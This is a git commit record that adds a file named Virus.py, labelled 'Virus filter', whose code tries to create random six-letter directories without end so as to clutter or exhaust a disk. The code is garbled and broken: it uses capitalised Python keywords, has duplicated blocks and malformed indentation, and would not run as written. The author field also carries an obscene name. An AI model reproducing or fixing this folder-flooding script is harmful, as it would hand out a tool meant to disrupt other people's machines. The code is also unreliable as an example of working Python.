0d61ebfd10c4471fd2dfe5e8ff90171680a9105a
report-samp-obscene-pornography <bulletmohamad552@gmail.com>
2024-11-07 07:40:44 +0330

    Add files via upload
    Virus filter

---
+++ Virus.py
@@ -0,0 +1,15 @@
+From rand_string.rand_string import RandString
+import OS
+For i in range(5):
+    Os.mkdir(RandString("uppercase",6))
+    From rand_string.rand_string import RandString
+import OS
+For i in range(5):
+    Os.mkdir(RandString("uppercase",6))
+    From rand_string.rand_string import RandString
+import OS
+While True:
+    Try:
+        Os.mkdir(RandString("uppercase",6))
+    Except FileExistsError:
+        Pass
